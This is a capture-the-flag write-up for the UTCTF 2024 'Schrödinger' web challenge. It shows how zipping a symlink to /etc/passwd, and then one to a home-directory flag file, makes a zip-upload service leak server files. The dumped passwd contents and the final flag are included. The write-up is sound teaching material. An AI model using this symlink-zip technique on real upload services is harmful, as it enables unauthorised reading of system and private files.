---
title: "Schrödinger"
description: "Hey, my digital cat managed to get into my server and I can't get him out."
points: 314
solves: 250
date: April 1 2024
author: Jozef Steinhübl
---

In this task, we need to find `flag.txt` by uploading the zip via the website.

![schrödinger](https://raw.githubusercontent.com/GerlachSnezka/utctf/main/assets/2024-web-schrodinger.png)

Since in the task, there's that flag.txt is located in the home folder, it will probably be in `home/<user>/flag.txt`

Although we don't know the user's name, we can still get it. If you're more proficient with Linux, you know that `/etc/passwd` contains all the users. So we can zip a file that is not a pure file or folder, but a symlink to /etc/passwd. With this, the web will then return the file's content to us.

```sh
ln -s "/etc/passwd" link
zip -y payload.zip link # use -y to don't save our /etc/passwd
```

We'll get:
```
---------------link---------------

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
copenhagen:x:1000:1000::/home/copenhagen:/bin/sh
```

In the very last line, we see `copenhagen:x:1000:1000:1000::/home/copenhagen:/bin/sh`, indicating that the cat is named `copenhagen`

We can create symlink again and this time to `/home/copenhagen/flag.txt`
```sh
ln -s "/home/copenhagen/flag.txt" link
zip -y payload.zip link # use -y to don't save our /etc/passwd
```

And we get our dream flag:
```
utflag{No_Observable_Cats_Were_Harmed}
```